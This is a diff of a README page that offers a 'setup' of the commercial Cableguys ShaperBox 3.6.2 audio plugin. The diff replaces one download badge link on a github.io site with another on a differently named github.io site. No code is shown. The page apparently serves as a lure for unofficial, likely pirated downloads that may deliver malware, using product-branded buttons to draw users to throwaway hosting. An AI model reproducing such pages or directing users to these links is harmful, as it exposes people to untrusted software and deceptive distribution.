@@ -21,7 +21,7 @@ To begin using this **Cableguys ShaperBox 3.6.2 multiband effects plugin** and *
 | :--- | :--- |
 | **Get Cableguys ShaperBox 3.6.2** | Click the button below to start the setup for this **Cableguys ShaperBox 3.6.2 audio shaping tool**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Cableguys_ShaperBox_3.6.2-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/cableguys-shaper-box-3-6-2)
+[![ShaperBox](https://img.shields.io/badge/Launch-ShaperBox%20-B91C1C?style=for-the-badge)](https://shaperbox-3-review.github.io/.github/shaperbox-3)
 
 ## System Requirements
 
